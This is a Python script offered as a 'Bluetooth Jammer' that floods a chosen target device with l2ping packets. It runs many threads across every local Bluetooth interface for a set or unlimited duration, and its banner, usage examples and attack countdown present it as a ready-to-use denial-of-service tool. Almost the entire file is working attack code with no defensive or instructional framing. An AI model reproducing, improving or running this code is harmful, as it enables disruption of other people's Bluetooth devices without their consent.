#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
from multiprocessing import cpu_count

def is_root():
    """Check if running as root"""
    return os.geteuid() == 0

def install_requirements(force=False):
    """Install required packages"""
    print("[*] Installing required packages...")
    
    try:
        # Try without sudo first if force is True
        if force:
            try:
                subprocess.run(['apt', 'update'], check=True)
                subprocess.run(['apt', 'install', '-y', 'bluez', 'bluez-tools'], check=True)
                print("[+] Successfully installed required packages (non-root)")
                return True
            except subprocess.CalledProcessError as e:
                print(f"[!] Non-root installation failed: {e}")
                return False
        
        # Normal installation with sudo
        if is_root():
            subprocess.run(['apt', 'update'], check=True)
            subprocess.run(['apt', 'install', '-y', 'bluez', 'bluez-tools'], check=True)
        else:
            subprocess.run(['sudo', 'apt', 'update'], check=True)
            subprocess.run(['sudo', 'apt', 'install', '-y', 'bluez', 'bluez-tools'], check=True)
        
        print("[+] Successfully installed required packages")
        return True
    except Exception as e:
        print(f"[!] Failed to install requirements: {e}")
        if 'sudo' in str(e):
            print("[!] Sudo not found. Try running as root or use --force for non-root install")
        return False

def check_bluetooth_tools(force=False):
    """Check if required tools are installed"""
    required_tools = ['l2ping', 'hcitool', 'bluetoothctl']
    missing = []
    for tool in required_tools:
        try:
            subprocess.check_output(['which', tool], stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            missing.append(tool)
    
    if missing:
        print(f"[!] Missing required tools: {', '.join(missing)}")
        if force or input("[?] Attempt to install automatically? (y/n/force) ").lower() in ('y', 'force'):
            return install_requirements(force='force' in sys.argv)
        else:
            print("[*] You can manually install with: sudo apt install bluez bluez-tools")
            print("[*] Or run with --force to attempt non-root installation")
            sys.exit(1)
    return True

def get_bluetooth_interfaces():
    """Get available Bluetooth interfaces"""
    try:
        output = subprocess.check_output(['hciconfig']).decode()
        interfaces = [line.split(':')[0] for line in output.split('\n') 
                     if line.strip() and not line.startswith(' ')]
        return interfaces if interfaces else ['hci0']  # default
    except Exception as e:
        print(f"[!] Error getting Bluetooth interfaces: {e}")
        return ['hci0']  # fallback

def DOS(target_addr, interface, packet_size, duration):
    """Denial of Service attack function"""
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            subprocess.run(
                ['l2ping', '-i', interface, '-s', str(packet_size), '-f', target_addr],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except Exception as e:
        print(f'[!] ERROR in DOS thread: {e}')

def continuous_scan(interface):
    """Continuous scanning to keep the interface active"""
    while True:
        try:
            subprocess.run(['hcitool', '-i', interface, 'scan'], 
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL,
                          timeout=10)
        except:
            pass

def print_banner():
    """Print the tool banner"""
    print(r"""
    \033[1;31m
     ____  _      ____  _____ _____ _   _ 
    |  _ \| |    / ___||_   _| ____| \ | |
    | |_) | |    \___ \  | | |  _| |  \| |
    |  _ <| |___  ___) | | | | |___| |\  |
    |_| \_\_____||____/  |_| |_____|_| \_|
                                    
    Bluetooth Jammer (Non-Root Version)
    \033[0m
    """)

def main():
    # Check for force install flag
    force_install = '--force' in sys.argv
    
    if not check_bluetooth_tools(force=force_install):
        return
    
    interfaces = get_bluetooth_interfaces()
    print_banner()
    
    if len(sys.argv) > 1 and sys.argv[1] in ('-h', '--help'):
        print("Usage: python3 bluetooth_jammer.py [target_address] [packet_size] [threads] [duration] [--force]")
        print("Example: python3 bluetooth_jammer.py 11:22:33:44:55:66 600 8 60 --force")
        return
    
    try:
        # Filter out --force from arguments
        args = [arg for arg in sys.argv[1:] if arg != '--force']
        
        if len(args) > 0:
            target_addr = args[0]
            packet_size = int(args[1]) if len(args) > 1 else 600
            threads_count = int(args[2]) if len(args) > 2 else 4
            duration = int(args[3]) if len(args) > 3 else 0
        else:
            target_addr = input('Enter target Bluetooth address (e.g., 11:22:33:44:55:66) > ').strip()
            packet_size = int(input('Enter packet size (300-1200 recommended) > ').strip())
            threads_count = int(input('Enter number of threads (recommend 4-16) > ').strip())
            duration = int(input('Enter attack duration in seconds (0 for unlimited) > ').strip())
    except (ValueError, IndexError) as e:
        print(f"[!] Invalid input: {e}")
        return
    
    if not target_addr or ':' not in target_addr:
        print("[!] Invalid Bluetooth address format")
        return
    
    # Start continuous scanning on all interfaces
    for interface in interfaces:
        threading.Thread(target=continuous_scan, args=(interface,), daemon=True).start()
    
    print("\n\033[1;31m[*] Initializing attack in 5 seconds...\033[0m")
    for i in range(5, 0, -1):
        print(f"[*] {i}")
        time.sleep(1)
    
    print("\n\033[1;31m[*] Starting attack... Press Ctrl+C to stop\033[0m")
    
    # Start attack threads
    threads = []
    start_time = time.time()
    
    try:
        for interface in interfaces:
            for i in range(threads_count):
                t = threading.Thread(
                    target=DOS,
                    args=(target_addr, interface, packet_size, duration if duration > 0 else float('inf')),
                    daemon=True
                )
                t.start()
                threads.append(t)
                print(f"[*] Started thread {i+1} on interface {interface}")
        
        # Monitor attack
        while True:
            elapsed = int(time.time() - start_time)
            if duration > 0 and elapsed >= duration:
                print("\n[*] Attack completed")
                break
            print(f"\r[*] Attack running for {elapsed}s (Packets: {packet_size}, Threads: {len(threads)})", end='')
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] Stopping attack...")
    finally:
        print("[*] Cleaning up...")
        time.sleep(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
